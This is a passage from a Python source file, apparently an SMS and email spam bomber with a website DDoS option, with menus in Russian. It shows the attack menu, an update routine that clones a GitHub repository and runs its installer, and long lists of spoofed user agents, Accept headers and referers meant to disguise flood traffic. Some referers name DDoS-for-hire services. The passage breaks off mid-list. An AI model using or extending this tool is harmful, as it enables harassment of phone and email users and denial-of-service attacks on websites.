  print ('[1] - ТОЛЬКО СПАМ СМС')
  print ('[2] - ТОЛЬКО СПАМ ПОЧТЫ')
  print ('[3] - DDOS САЙТА')
  print ('[4] - НАЗАД')
  choose2 = input ('>>>')
  if choose2 == '1':
    sms()
  if choose2 == '2':
    mail()
  if choose2 == '3':
    setting()
  if choose2 == '4':
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    openspam()
      
def openupdate():
  if os.name == 'nt':
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Операционная система Windows не обслуживается!!')
    time.sleep(2)
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[*] Происходит установка...')
    os.system("cd && rm -rf ~/spammer-by-ARnoLD && git clone https://github.com/palkamilka/spammer-by-ARnoLD && python ~/spammer-by-ARnoLD/install.py")
      
def conection():
  os.system('cls' if os.name=='nt' else 'clear')
  print (logo)
  print ('[!] Нет интернет соединения')
  print ('[1] - ПРОВЕРИТЬ ПОДКЛЮЧЕНИЕ')
  connect = input ('>>>')
  if connect == '1':
    main()
  else:
    os.system('cls' if os.name=='nt' else 'clear')
    print (logo)
    print ('[!] Ошибка! Повтори запрос!')
    time.sleep(2)
    connection()
import requests, random, time, json, colorama, os, threading, socks, socket 
import smtplib as root
from colorama import Fore, Back
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
colorama.init()
logo = '''
╔═══╦═══╗     ╔╗  ╔═══╗
║╔═╗║╔═╗║     ║║  ╚╗╔╗║
║║ ║║╚═╝╠═╗╔══╣║   ║║║║
║╚═╝║╔╗╔╣╔╗╣╔╗║║ ╔╗║║║║
║╔═╗║║║╚╣║║║╚╝║╚═╝╠╝╚╝║
╚╝ ╚╩╝╚═╩╝╚╩══╩═══╩═══╝'''
userag=["Mozilla/5.0(Windows;U;WindowsNT6.1;sv-SE)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.3Safari/533.19.4","Mozilla/5.0(Linux;Android7.0;SM-G930VCBuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/58.0.3029.83MobileSafari/537.36","Mozilla/5.0(Linux;Android7.0;SM-G892ABuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/60.0.3112.107MobileSafari/537.36","Mozilla/5.0(Linux;Android7.1.1;G8231Build/41.2.A.0.219;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/59.0.3071.125MobileSafari/537.36"]
acpt=["Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",]
useragent=["Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.75.14(KHTML,likeGecko)Version/7.0.3Safari/7046A194A","Mozilla/5.0(iPad;CPUOS6_0likeMacOSX)AppleWebKit/536.26(KHTML,likeGecko)Version/6.0Mobile/10A5355dSafari/8536.25","Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/537.13+(KHTML,likeGecko)Version/5.1.7Safari/534.57.2","Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10","Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/70.0.3538.77Safari/537.36","Mozilla/5.0(WindowsNT6.2;WOW64)AppleWebKit/537.36(KHTMLlikeGecko)Chrome/44.0.2403.155Safari/537.36","Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36","Mozilla/5.0(X11;Linuxi686;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(WindowsNT6.1;WOW64;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(X11;Linuxi586;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(WindowsNT6.2;WOW64;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US;rv:1.8.1.13)Gecko/20080313Firefox","Mozilla/5.0(Macintosh;U;PPCMacOSXMach-O;rv:1.8.1.16)Gecko/20080702Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;de-DE;rv:1.9.2.20)Gecko/20110803Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;en-GB;rv:1.9.0.6)Gecko/2009011913Firefox","Mozilla/5.0(X11;;Linuxx86_64;rv:1.8.1.6)Gecko/20070802Firefox","Mozilla/5.0(X11;U;GentooLinuxx86_64;pl-PL)GeckoFirefox"]#CodeByGogoZin
acceptall=[
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n",
"Accept-Encoding:gzip,deflate\r\n",
"Accept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Charset:iso-8859-1\r\nAccept-Encoding:gzip\r\n",
"Accept:application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset:iso-8859-1\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\n",
"Accept:image/jpeg,application/x-ms-application,image/gif,application/xaml+xml,image/pjpeg,application/x-ms-xbap,application/x-shockwave-flash,application/msword,*/*\r\nAccept-Language:en-US,en;q=0.5\r\n",
"Accept:text/html,application/xhtml+xml,image/jxr,*/*\r\nAccept-Encoding:gzip\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\n",
"Accept:text/html,application/xml;q=0.9,application/xhtml+xml,image/png,image/webp,image/jpeg,image/gif,image/x-xbitmap,*/*;q=0.1\r\nAccept-Encoding:gzip\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\n,"
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n",
"Accept-Charset:utf-8,iso-8859-1;q=0.5\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\n",
"Accept:text/html,application/xhtml+xml",
"Accept-Language:en-US,en;q=0.5\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",
"Accept:text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset:iso-8859-1\r\n",]
referers=[
"https://www.google.com/search?q=",
"https://check-host.net/",
"https://www.facebook.com/",
"https://www.youtube.com/",
"https://cyber-hub.pw/"
"https://www.vedbex.com/tools/home"
"https://www.ibm.com/cloud"
"https://voxility.com/"
"https://www.redwolfsecurity.com/"
"https://www.ionos.com/"
"https://duckduckgo.com/"
"http://ffm.cloudlayar.xyz/HIT",
"https://1gb.ru/",
"https://artplanet.ru/",
"https://api.freeboot.to/",
"https://www.react.su/"
"https://synstresser.to/"
"https://freeboot.to/"
"https://dosninja.com/"
"http://ddos-protection.ru/"
"https://www.fbi.com/",
"https://www.bing.com/search?q=",
"https://www.cloudflare.com/",
"https://www.ovh.ie/",
"https://www.hetzner.com/",
"https://ddos-guard.net/",
"https://blazingfast.io/",
"https://www.rambler.ru/",
"https://selectel.ru/"
"https://www.cloudns.net/"
"http://1.1.1.1/"
"http://regex.info/exif.cgi?url="
"https://upcloud.com/"
"https://www.nhc.noaa.gov/"
"https://www.youtube.com/"
"https://www.online.net/"
"https://www.linode.com/"
"https://www.datacamp.com/"
"https://yandex.ru/"
"https://beget.com/"
"https://add.my.yahoo.com/rss?url"
"https://www.hostgator.com/"
"https://www.bluehost.com"
"https://play.google.com/store/search?q="
"https://github.com/"
"https://www.twitter.com/"
"https://google.com/"
"https://www.kaspersky.ru/"
"https://firstvds.ru"
"https://www.croc.ru/"
"https://yandex.kz/"
"https://www.reg.ru/"
"https://m.ok.ru/"
"https://vk.com/"
"https://www.first-colo.net/"
"https://cyberwarblog.xyz"
"https://www.liquidweb.com/"
"https://www.servereasy.it/"
"https://twitch.com"
"https://www.stackpath.com/"
"https://cloudnode.pw/"
"https://r.search.yahoo.com/",
]

useragents=["AdsBot-Google(http://www.google.com/adsbot.html)",
"AvantBrowser/1.2.789rel1(http://www.avantbrowser.com)",
"TelegramBot(likeTwitterBot)"
"Mozilla/5.0(Macintosh;IntelMacOSX10_13_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/77.0.3865.90Safari/537.36TelegramBot(likeTwitterBot)"
"Mozilla/5.0(compatible;YandexAdNet/1.0;+http://yandex.com/bots)"
"Mozilla/5.0(compatible;Cloudflare-Smart-Transit/1.0;+https://www.cloudflare.com/"
"Mozilla/5.0(Linux;Android5.0;SM-G920A)AppleWebKit(KHTML,likeGecko)ChromeMobileSafari(compatible;AdsBot-Google-Mobile;+http://www.google.com/mobile/adsbot.html)"
"Googlebot/2.1(+http://www.google.com/bot.html)""Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2272.96MobileSafari/537.36(compatible;Pinterestbot/1.0;+http://www.pinterest.com/bot.html)"
"Mozilla/5.0(iPhone;CPUiPhoneOS8_1likeMacOSX)AppleWebKit/600.1.4(KHTML,likeGecko)Version/8.0Mobile/12B411Safari/600.1.4(compatible;YandexBot/3.0;+http://yandex.com/bots)"
"Mozilla/5.0(Slurp/cat;slurp@inktomi.com;http://www.inktomi.com/slurp.html)"
"Mozilla/5.0(Macintosh;IntelMacOSX10_8_3)AppleWebKit/536.28.10(KHTML,likeGecko)Version/6.0.3Safari/536.28.10",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:20.0)Gecko/20100101Firefox/20.0",
"Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2272.96MobileSafari/537.36(compatible;Googlebot/2.1;+http://www.google.com/bot.html)",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36(compatible;YandexScreenshotBot/3.0;+http://yandex.com/bots)"
"Mozilla/5.0(compatible;Cloudflare-Smart-Transit/1.0;+https://www.cloudflare.com/",
"Mozilla/5.0(compatible;CloudFlare-AlwaysOnline/1.0;+http://www.cloudflare.com/always-online)AppleWebKit/534.34",
"Mozilla/5.0(compatible;MSIE9.0;AOL9.7;AOLBuild4343.19;WindowsNT6.1;WOW64;Trident/5.0;FunWebProducts)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.5(KHTML,likeGecko)Version/5.1.7Safari/534.57.4",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;SV1;.NETCLR2.0.50727)",
"Mozilla/5.0(compatible;AhrefsBot/6.1;+http://ahrefs.com/robot/)",
"Mozilla/5.0(Linux;U;Android5.1;zh-cn;Build/LMY47D)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Chrome/50.0.0.0MobileSafari/534.30GIONEE-GN9010/GN9010RV/5.0.16",
"Mozilla/5.0(compatible;Google-Site-Verification/1.0)",
"Dalvik/1.6.0(Linux;U;Android4.4.2;GT-I9190Build/KOT49H)",
"Mozilla/5.0(Linux;Android4.4.2;DEXPIxionES24.5Build/KOT49H)AppleWebKit/537.36(KHTML,likeGecko)Chrome/34.0.1847.131YaBrowser/14.5.1847.18432.00MobileSafari/537.36",
"Mozilla/5.0(Linux;U;Android6.0;zh-cn;Build/MRA58K)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Chrome/50.0.0.0MobileSafari/534.30GIONEE-S9/S9RV/5.0.17",
"VK/28CFNetwork/711.4.6Darwin/14.0.0",
"Instagram8.2.0(iPhone4,1;iPhoneOS8_4;ru_RU;ru;scale=2.00;640x960)AppleWebKit/420+",
"Mozilla/5.0(Macintosh;IntelMacOSX10_11_5)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.106Safari/537.36",
"Mozilla/5.0(compatible;MJ12bot/v1.4.5;http://www.majestic12.co.uk/bot.php?+)"
"Mozilla/5.0(compatible;vkShare;+vk.com/dev/Share)",
"Mozilla/5.0(WindowsMobile10;Android8.0.0;Microsoft;Lumia950XL)AppleWebKit/537.36(KHTML,likeGecko)Chrome/80.0.3987.149MobileSafari/537.36Edge/80.0.361.62"
"Mozilla/5.0(Linux;Android5.1.1)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Focus/2.3Chrome/59.0.3071.125MobileSafari/537.36"
"Mozilla/5.0(Linux;Android6.0;Nexus5Build/MRA58N)"
"Mozilla/5.0(X11;Linuxaarch64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/52.0.2743.84Safari/537.36CrKey/1.21a.76178",
"Sogouheadspider/3.0(http://www.sogou.com/docs/help/webmasters.htm#07)",
"Mozilla/5.0(WindowsNT10.0;WOW64;rv:46.0)Gecko/20100101Firefox/46.0"
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/78.0.3904.99Safari/537.36Vivaldi/2.9.1705.41",
"Mozilla/5.0(Linux;Android9;STF-L09Build/HUAWEISTF-L09;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/79.0.3945.79MobileSafari/537.36[Pinterest/Android]",
"Mozilla/5.0(iPhone;CPUiPhoneOS13_3_1likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Mobile/15E148[FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Verizon]",
"Mozilla/5.0(iPhone;CPUiPhoneOS13_3likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Mobile/15E148[FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/AT&T]",
"Mozilla/5.0(Macintosh;IntelMacOSX10_15_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/75.0.3770.100Safari/537.36",
"Mozilla/5.0(Macintosh;IntelMacOSX10_15_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/75.0.3770.100Safari/537.36",
"WeatherReport/1.2.1CFNetwork/485.12.7Darwin/10.4.0",
"WeatherReport/1.2.2CFNetwork/485.12.7Darwin/10.4.0",
"Mozilla/5.0(iPhone;CPUiPhoneOS12_3_1likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.1.1Mobile/15E148Safari/604.1",
"Mozilla/5.0(Linux;Android4.2.2;PhilipsS388Build/JDQ39)AppleWebKit/537.36(KHTML,likeGecko)Chrome/47.0.2526.73MobileSafari/537.36OPR/34.0.2044.98679"
"Mozilla/5.0(compatible;Discordbot/2.0;+https://discordapp.com)"
"Googlebot/2.1(http://www.googlebot.com/bot.html)"
"Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.103Safari/537.36",
"Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/52.0.2743.116Safari/537.36",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.103Safari/537.36",
"APIs-Google(+https://developers.google.com/webmasters/APIs-Google.html)"
"Mozilla/5.0(Linux;Android4.4;Nexus5Build/_BuildID_)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/30.0.0.0MobileSafari/537.36"
"Opera/9.80(X11;Linuxi686;Ubuntu/14.10)Presto/2.12.388Version/12.16"
"Mozilla/5.0(Linux;U;Android2.3.1;en-us;MIDBuild/GINGERBREAD)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android4.2.2;en-us;MIDBuild/JDQ39)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Safari/534.30[FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/80.0.3987.137Safari/537.36OPR/67.0.3575.79"
"Mozilla/5.0(compatible;Bingbot/2.0;+http://www.bing.com/bingbot.htm)"
"Mozilla/5.0(compatible;Yahoo!Slurp;http://help.yahoo.com/help/us/ysearch/slurp)"
"DuckDuckBot/1.0;(+http://duckduckgo.com/duckduckbot.html)"
"Mozilla/5.0(compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)"
"Mozilla/5.0(compatible;Exabot/3.0;+http://www.exabot.com/go/robot)"
"Mozilla/5.0(compatible;Konqueror/3.5;Linux)KHTML/3.5.5(likeGecko)(Exabot-Thumbnails"
"facebookexternalhit/1.1(+http://www.facebook.com/externalhit_uatext.php)"
"ia_archiver(+http://www.alexa.com/site/help/webmasters;crawler@alexa.com)"
"Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/W.X.Y.Zâ€¡MobileSafari/537.36(compatible;Googlebot/2.1;+http://www.google.com/bot.html)"
"Mozilla/5.0(Linux;Android8.1.0;motorolaoneBuild/OPKS28.63-18-3;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/70.0.3538.80MobileSafari/537.36Instagram72.0.0.21.98Android(27/8.1.0;320dpi;720x1362;motorola;motorolaone;deen_sprout;qcom;pt_BR;132081645)"
"Googlebot/2.1(+http://www.google.com/bot.html)"
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36"
"Baiduspider(http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0(compatible;Linuxx86_64;Mail.RU_Bot/Robots/2.0;+http://go.mail.ru/help/robots)"
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.7.12)Gecko/20051010Firefox/1.0.7(Ubuntupackage1.0.7)"
"BlackBerry7100i/4.1.0Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/103",
"BlackBerry7520/4.0.0Profile/MIDP-2.0Configuration/CLDC-1.1UP.Browser/5.0.3.3UP.Link/5.1.2.12(GoogleWAPProxy/1.0)",
"BlackBerry8300/4.2.2Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/107UP.Link/6.2.3.15.0",
"Mozilla/5.0(Android;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(Android;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(WindowsCE6.0;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT5.1;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(WindowsNT5.2;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/535.2(KHTML,likeGecko)Chrome/18.6.872.0Safari/535.2UNTRUSTED/1.03gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20120403211507Firefox/12.0",
"Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;Win64;x64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/534.27(KHTML,likeGecko)Chrome/12.0.712.0Safari/534.27",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.24Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1092.0Safari/536.6",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:15.0)Gecko/20120427Firefox/15.0a1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:2.0b4pre)Gecko/20100815Minefield/4.0b4pre",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:6.0a2)Gecko/20110622Firefox/6.0a2",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:7.0.1)Gecko/20100101Firefox/7.0.1",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1061.1Safari/536.3",
"Mozilla/5.0(Windows;U;;en-NZ)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.8.0",
"Mozilla/5.0(Windows;U;Win98;en-US;rv:1.4)GeckoNetscape/7.1(ax)",
"Mozilla/5.0(Windows;U;WindowsCE5.1;rv:1.8.1a3)Gecko/20060610Minimo/0.016",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.8.1.23)Gecko/20090825SeaMonkey/1.1.18",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.0.10)Gecko/2009042316Firefox/3.0.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;tr;rv:1.9.2.8)Gecko/20100722Firefox/3.6.8(.NETCLR3.5.30729;.NET4.0E)",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.310.0Safari/532.9",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/533.17.8(KHTML,likeGecko)Version/5.0.1Safari/533.17.8",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-GB;rv:1.9.0.11)Gecko/2009060215Firefox/3.0.11(.NETCLR3.5.30729)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.6(Change:)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/533.1(KHTML,likeGecko)Maxthon/3.0.8.2Safari/533.1",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/9.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US;rv:1.9.1.6)Gecko/20091201Firefox/3.5.6GTB5",
"Mozilla/5.0(Windows;U;WindowsNT6.0x64;en-US;rv:1.9pre)Gecko/2008072421Minefield/3.0.2pre",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-GB;rv:1.9.1.17)Gecko/20110123(likeFirefox/3.x)SeaMonkey/2.0.12",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/532.5(KHTML,likeGecko)Chrome/4.0.249.0Safari/532.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.2Safari/533.18.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/10.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.20(KHTML,likeGecko)Chrome/11.0.672.2Safari/534.20",
"Mozilla/5.0(Windows;U;WindowsXP)GeckoMultiZilla/1.6.1.0a",
"Mozilla/5.0(Windows;U;WinNT4.0;en-US;rv:1.2b)Gecko/20021001Phoenix/0.2",
"Mozilla/5.0(X11;FreeBSDamd64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/534.34(KHTML,likeGecko)QupZilla/1.2.0Safari/534.34",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.1(KHTML,likeGecko)Ubuntu/11.04Chromium/14.0.825.0Chrome/14.0.825.0Safari/535.1",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.2(KHTML,likeGecko)Ubuntu/11.10Chromium/15.0.874.120Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(X11;Linuxi686;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(X11;Linuxi686;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6pre",
"Mozilla/5.0(X11;Linuxi686;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686;rv:6.0a2)Gecko/20110615Firefox/6.0a2Iceweasel/6.0a2",
"Mozilla/5.0(X11;Linuxi686;rv:6.0)Gecko/20100101Firefox/6.0",
"Mozilla/5.0(X11;Linuxi686;rv:8.0)Gecko/20100101Firefox/8.0",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/534.24(KHTML,likeGecko)Ubuntu/10.10Chromium/12.0.703.0Chrome/12.0.703.0Safari/534.24",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.20Safari/535.1",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.9Safari/536.5",
"Mozilla/5.0(X11;Linuxx86_64;en-US;rv:2.0b2pre)Gecko/20100712Minefield/4.0b2pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:11.0a2)Gecko/20111230Firefox/11.0a2Iceweasel/11.0a2",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.2a1pre)Gecko/20100101Firefox/4.2a1pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:5.0)Gecko/20100101Firefox/5.0Iceweasel/5.0",
"Mozilla/5.0(X11;Linuxx86_64;rv:7.0a1)Gecko/20110623Firefox/7.0a1",
"Mozilla/5.0(X11;U;FreeBSDamd64;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;FreeBSDi386;de-CH;rv:1.9.2.8)Gecko/20100729Firefox/3.6.8",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US)AppleWebKit/532.0(KHTML,likeGecko)Chrome/4.0.207.0Safari/532.0",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US;rv:1.6)Gecko/20040406Galeon/1.3.15",
"Mozilla/5.0(X11;U;FreeBSD;i386;en-US;rv:1.7)Gecko",
"Mozilla/5.0(X11;U;FreeBSDx86_64;en-US)AppleWebKit/534.16(KHTML,likeGecko)Chrome/10.0.648.204Safari/534.16",
"Mozilla/5.0(X11;U;Linuxarm7tdmi;rv:1.8.1.11)Gecko/20071130Minimo/0.025",
"Mozilla/5.0(X11;U;Linuxarmv61;en-US;rv:1.9.1b2pre)Gecko/20081015Fennec/1.0a1",
"Mozilla/5.0(X11;U;Linuxarmv6l;rv1.8.1.5pre)Gecko/20070619Minimo/0.020",
"Mozilla/5.0(X11;U;Linux;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.1",
"Mozilla/5.0(X11;U;Linuxi586;en-US;rv:1.7.3)Gecko/20040924Epiphany/1.4.4(Ubuntu)",
"Mozilla/5.0(X11;U;Linuxi686;en-us)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)lt-GtkLauncher",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.4(KHTML,likeGecko)Chrome/4.0.237.0Safari/532.4Debian",
